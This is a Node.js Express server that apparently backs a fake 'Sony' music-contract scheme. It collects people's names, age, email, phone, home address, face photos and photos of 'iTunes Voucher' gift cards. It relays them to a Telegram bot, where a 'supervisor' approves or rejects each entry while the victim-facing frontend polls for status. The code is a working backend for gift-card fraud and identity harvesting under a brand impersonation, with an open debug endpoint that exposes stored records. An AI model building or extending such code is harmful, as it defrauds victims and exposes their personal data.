require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const SUPERVISOR_CHAT_ID = process.env.SUPERVISOR_CHAT_ID;

app.use(cors({ origin: "*" }));
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 10 * 1024 * 1024 } });

const approvals = {};
let lastUpdateId = 0;

app.get("/", (req, res) => {
  res.send(`<h1>Sony Backend Live ✓ ITUNES VOUCHER QUOTED</h1>
  <p>POST /api/forward-to-telegram -> sends Accept/Reject buttons</p>
  <p>GET /api/status/:contractId -> frontend polling</p>
  <p>POST /webhook -> Telegram callback</p>
  <p><a href="/debug/approvals">Debug approvals</a></p>`);
});
app.get("/health", (req, res) => res.send("OK"));
app.get("/debug/approvals", (req, res) => res.json(approvals));

app.get("/api/status/:contractId", (req, res) => {
  const id = req.params.contractId;
  const data = approvals[id];
  if (!data) return res.json({ status: 'pending', contractId: id, note: 'waiting for approval data - instance may have restarted' });
  res.json(data);
});

// Helper to make quoted text
function qt(text){
  // Wrap in blockquote for Telegram quoted look
  return `<blockquote>${text}</blockquote>`;
}

async function sendApprovalRequest({ contractId, artistName, legalName, phone, region, faceBuffer, idBuffer }) {
  if (!BOT_TOKEN ||!SUPERVISOR_CHAT_ID) {
    console.log("Missing env");
    return;
  }
  const rawCaption = `
🎤 NEW CONTRACT - REQUIRES APPROVAL 🎤
━━━━━━━━━━━━━━━━━━━━
👤 Artist: ${artistName}
📛 Legal: ${legalName}
📱 Phone: ${phone}
🌍 Country: ${region}
🆔 Contract: ${contractId}
🎫 Given ID: 1100223
🎫 iTunes Voucher Attached
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━
🖼️ Face + iTunes Voucher attached
👇 Choose:
`;
  const caption = qt(rawCaption);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Accept", callback_data: `accept_${contractId}` },
        { text: "❌ Reject", callback_data: `reject_${contractId}` }
      ]
    ]
  };
  try {
    if (faceBuffer) {
      const form = new FormData();
      form.append('chat_id', SUPERVISOR_CHAT_ID);
      form.append('photo', faceBuffer, { filename: `FACE_${artistName}.jpg` });
      form.append('caption', qt(`Face: ${artistName} | ${contractId}`));
      form.append('parse_mode', 'HTML');
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });
    }
    if (idBuffer) {
      const form2 = new FormData();
      form2.append('chat_id', SUPERVISOR_CHAT_ID);
      form2.append('photo', idBuffer, { filename: `VOUCHER_${artistName}.jpg` });
      form2.append('caption', qt(`iTunes Voucher: ${artistName} | 1100223 | ${contractId} | Front & Back`));
      form2.append('parse_mode', 'HTML');
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form2, { headers: form2.getHeaders() });
    }
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: SUPERVISOR_CHAT_ID,
      text: caption,
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  } catch (e) {
    console.error("Telegram send error", e.response?.data || e.message);
  }
}

app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: 'facePhoto' }, { name: 'idPhoto' }, { name: 'photo', maxCount: 5 }]), async (req, res) => {
  try {
    const body = req.body || {};
    const files = req.files || {};
    let faceBuffer = null;
    let idBuffer = null;
    if (req.file && req.file.buffer) faceBuffer = req.file.buffer;
    if (files.photo && files.photo[0]) faceBuffer = files.photo[0].buffer;
    if (files.facePhoto && files.facePhoto[0]) faceBuffer = files.facePhoto[0].buffer;
    if (files.idPhoto && files.idPhoto[0]) idBuffer = files.idPhoto[0].buffer;
    if (!faceBuffer && body.facePhotoBase64 && body.facePhotoBase64.startsWith('data:image')) {
      faceBuffer = Buffer.from(body.facePhotoBase64.split(';base64,').pop(), 'base64');
    }
    if (!faceBuffer && body.photoBase64 && body.photoBase64.startsWith('data:image')) {
      faceBuffer = Buffer.from(body.photoBase64.split(';base64,').pop(), 'base64');
    }
    if (!idBuffer && body.idPhotoBase64 && body.idPhotoBase64.startsWith('data:image')) {
      idBuffer = Buffer.from(body.idPhotoBase64.split(';base64,').pop(), 'base64');
    }
    const { artistName, legalName, age, email, phone, address, married, kids, kidsNum, region, contractId, type } = body;
    const finalCid = contractId || `SME-2026-${Math.floor(100+Math.random()*900)}-AF`;

    if (type === 'REQUIRES_APPROVAL' || idBuffer) {
      approvals[finalCid] = {
        status: 'pending',
        artistName: artistName || 'Unknown',
        contractId: finalCid,
        time: new Date().toISOString()
      };
      await sendApprovalRequest({
        contractId: finalCid,
        artistName: artistName || 'Unknown',
        legalName: legalName || 'N/A',
        phone: phone || 'N/A',
        region: region || 'N/A',
        faceBuffer,
        idBuffer
      });
      return res.json({ success: true, status: 'pending', contractId: finalCid, message: 'Sent for approval with Accept/Reject buttons' });
    }

    const rawText = `
🎤 NEW SONY CONTRACT (STEP 1 - FACE) 🎤
━━━━━━━━━━━━━━━━━━━━
👤 Artist: ${artistName}
📛 Legal: ${legalName}
🎂 Age: ${age}
📧 Email: ${email}
📱 Phone: ${phone}
🏠 Address: ${address}
🌍 Country: ${region}
🆔 Contract: ${finalCid}
⏰ ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━
⏳ Waiting for iTunes Voucher upload...
`;
    if (faceBuffer && BOT_TOKEN && SUPERVISOR_CHAT_ID) {
      const form = new FormData();
      form.append('chat_id', SUPERVISOR_CHAT_ID);
      form.append('photo', faceBuffer, { filename: `FACE_${artistName}.jpg` });
      form.append('caption', qt(rawText.slice(0, 900)));
      form.append('parse_mode', 'HTML');
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });
    } else if (BOT_TOKEN && SUPERVISOR_CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: SUPERVISOR_CHAT_ID,
        text: qt(rawText),
        parse_mode: "HTML"
      });
    }
    res.json({ success: true, contractId: finalCid });
  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "Failed", details: e.response?.data || e.message });
  }
});

app.post("/api/forward-idcard", upload.single('photo'), async (req, res) => {
  try {
    const { artistName, contractId } = req.body || {};
    const buf = req.file?.buffer;
    if (!buf) return res.status(400).json({ error: "No image" });
    if (!BOT_TOKEN ||!SUPERVISOR_CHAT_ID) return res.json({ success: true, forwarded: false });
    const form = new FormData();
    form.append('chat_id', SUPERVISOR_CHAT_ID);
    form.append('document', buf, { filename: `SONY_ID_${artistName}_${contractId}.png`, contentType: 'image/png' });
    form.append('caption', qt(`🪪 ID CARD GENERATED: ${artistName} | ${contractId}`));
    form.append('parse_mode', 'HTML');
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders() });
    res.json({ success: true });
  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "Failed" });
  }
});

async function handleCallback(cq){
  const data=cq.data;
  const chatId=cq.message.chat.id;
  const messageId=cq.message.message_id;
  try{
    if(data.startsWith('accept_')){
      const cid=data.replace('accept_','');
      approvals[cid]={...(approvals[cid]||{}), status:'accepted', contractId:cid, artistName:approvals[cid]?.artistName||'', time:new Date().toISOString()};
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{callback_query_id:cq.id, text:`✅ Accepted ${cid}`});
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:qt(`✅ ACCEPTED - ${cid} by supervisor\nArtist: ${approvals[cid]?.artistName||''}\nVoucher Verified\nTime: ${new Date().toLocaleString()}`),parse_mode:"HTML"});
    }else if(data.startsWith('reject_')){
      const cid=data.replace('reject_','');
      approvals[cid]={...(approvals[cid]||{}), status:'rejected', reason:'Rejected by supervisor - Invalid iTunes Voucher', contractId:cid, time:new Date().toISOString()};
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{callback_query_id:cq.id, text:`❌ Rejected ${cid}`});
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:qt(`❌ REJECTED - ${cid} by supervisor\nReason: Invalid iTunes Voucher\nTime: ${new Date().toLocaleString()}`),parse_mode:"HTML"});
    }
  }catch(e){ console.error("handleCallback", e.response?.data||e.message); }
}

app.post("/webhook", async (req, res) => {
  try {
    if(req.body.callback_query) await handleCallback(req.body.callback_query);
    res.sendStatus(200);
  } catch (e) {
    res.sendStatus(200);
  }
});

async function pollTelegram(){
  if(!BOT_TOKEN) return;
  try{
    const r=await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=5`);
    const updates=r.data?.result||[];
    for(const up of updates){
      lastUpdateId=Math.max(lastUpdateId, up.update_id);
      if(up.callback_query) await handleCallback(up.callback_query);
    }
  }catch(e){}
}
setInterval(pollTelegram, 3000);

app.get("/set-webhook", async (req, res) => {
  const url = req.query.url;
  if (!url) return res.send("Add?url=https://sonymusic.onrender.com/webhook");
  try {
    const r = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(url)}`);
    res.json(r.data);
  } catch (e) {
    res.status(500).json(e.response?.data || e.message);
  }
});

app.listen(PORT, () => console.log(`Sony supervisor bot QUOTED on ${PORT}`));